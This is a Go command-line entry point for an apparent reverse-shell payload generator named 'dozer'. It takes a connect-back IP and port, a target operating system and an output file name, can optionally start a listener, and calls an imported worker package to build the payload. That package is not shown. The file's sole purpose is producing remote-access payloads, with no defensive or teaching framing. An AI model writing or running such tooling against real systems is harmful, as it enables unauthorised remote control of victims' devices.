package main

import (
	"flag"
	"fmt"
	"os"
	"strings"

	"github.com/n0sh4d3/dozer/worker"
)

func main() {
	ip := flag.String("ip", "", "IP address to connect back to (required)")
	port := flag.Int("port", 0, "Port to connect back to (required)")
	output := flag.String("output", "dozer_payload", "Output file name")
	listener := flag.Bool("listener", false, "Start listener after creating shell")
	osys := flag.String("os", "", "Target OS (windows/linux/mac/android/ios)")

	flag.Parse()

	if *ip == "" || *port == 0 || *osys == "" {
		fmt.Println("Missing required flags. Use -h for help.")
		os.Exit(0)
	}

	dozer, err := worker.NewDozer(*ip, *port, strings.ToLower(*osys), *output, *listener)
	if err != nil {
		fmt.Println("Error:", err)
		os.Exit(0)
	}

	dozer.Create()
}
